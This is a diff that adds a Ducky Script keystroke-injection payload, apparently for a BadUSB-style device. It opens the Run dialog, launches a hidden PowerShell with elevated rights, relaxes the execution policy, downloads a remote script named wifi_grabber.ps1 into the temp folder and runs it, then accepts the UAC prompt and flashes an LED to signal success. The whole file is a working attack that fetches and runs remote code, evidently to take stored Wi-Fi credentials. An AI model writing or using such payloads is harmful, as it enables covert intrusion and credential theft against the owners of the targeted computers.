@@ -1,1 +1,19 @@
-toto
+LOCALE FR
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs -windowstyle hidden {Set-ExecutionPolicy RemoteSigned;wget "https://raw.githubusercontent.com/Allta/Laboratoire/master/wifi_grabber.ps1" -o $env:TEMP\d.ps1;cd $env:TEMP;.\d.ps1}
+REM Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
+REM CTRL-SHIFT ENTER
+ENTER
+REM Delay 0.5 seconds to give the UAC prompt time to open.
+DELAY 1000
+LEFT
+ENTER
+LED 0 255 0
+DELAY 500
+LED 0 0 0
+DELAY 250
+LED 0 255 0
+DELAY 500
+LED 0 0 0
